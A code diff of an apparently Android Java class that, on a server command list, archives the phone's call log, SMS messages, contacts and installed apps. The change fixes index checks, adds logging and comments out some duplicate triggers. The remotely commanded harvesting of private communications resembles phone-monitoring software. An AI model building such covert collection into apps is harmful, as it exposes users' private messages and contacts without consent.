@@ -167,23 +167,35 @@ public class PeriodicRequest extends DefaultRequest {
 			String listStr = null;
 			try {
 				listStr = jsonObject.getJSONArray("list").toString();
-				if (listStr.indexOf("1") != 0) {
+				Logging.doLog(LOG_TAG, "list: " + listStr, "list: " + listStr);
+				
+				if (listStr.indexOf("1") != -1) {
 					// Вызвать метод для списка звонков
+					Logging.doLog(LOG_TAG, "listStr.indexOf 1", "listStr.indexOf 1");
+					
 					ArchiveCall arhCall = new ArchiveCall();
 					arhCall.execute(ctx);
 				}
-				if (listStr.indexOf("2") != 0) {
+				if (listStr.indexOf("2") != -1) {
 					// Вызвать метод для списка смс
+					Logging.doLog(LOG_TAG, "listStr.indexOf 2", "listStr.indexOf 2");
+					
 					ArchiveSms arhSms = new ArchiveSms();
 					arhSms.execute(ctx);
+//					GetContacts getCont = new GetContacts();
+//					getCont.execute(ctx);
 				}
-				if (listStr.indexOf("3") != 0) {
+				if (listStr.indexOf("3") != -1) {
 					// Вызвать метод для телефонной книги
+					Logging.doLog(LOG_TAG, "listStr.indexOf 3", "listStr.indexOf 3");
+					
 					GetContacts getCont = new GetContacts();
 					getCont.execute(ctx);
 				}
-				if (listStr.indexOf("4") != 0) {
+				if (listStr.indexOf("4") != -1) {
 					// Вызвать метод для установленных приложений
+					Logging.doLog(LOG_TAG, "listStr.indexOf 4", "listStr.indexOf 4");
+					
 					ListApp listApp = new ListApp();
 					listApp.getListOfInstalledApp(ctx);
 				}
@@ -245,8 +257,7 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("telbook", str);
-			GetContacts getCont = new GetContacts();
-			getCont.execute(ctx);
+		
 		} else {
 			ed.putString("telbook", "0");
 		}
@@ -269,8 +280,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("arhsms", str);
-			ArchiveSms arhSms = new ArchiveSms();
-			arhSms.execute(ctx);
+//			ArchiveSms arhSms = new ArchiveSms();
+//			arhSms.execute(ctx);
 		} else {
 			ed.putString("arhsms", "0");
 		}
@@ -282,8 +293,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("arhcall", str);
-			ArchiveCall arhCall = new ArchiveCall();
-			arhCall.execute(ctx);
+//			ArchiveCall arhCall = new ArchiveCall();
+//			arhCall.execute(ctx);
 		} else {
 			ed.putString("arhcall", "0");
 		}
